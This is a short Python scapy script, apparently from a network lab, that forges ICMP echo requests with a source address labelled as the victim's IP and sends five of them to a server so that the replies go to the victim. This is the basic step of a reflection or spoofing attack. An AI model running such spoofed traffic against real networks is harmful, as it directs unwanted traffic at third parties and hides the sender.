from scapy.all import IP, ICMP, send


packet = IP(
    src="192.168.10.10",      # victim ip
    dst="192.168.20.100"      #  Server IP
) / ICMP(
    type=8                     # 8 = Echo Request
)

send(packet, iface="h2-eth0", count=5, verbose=True)
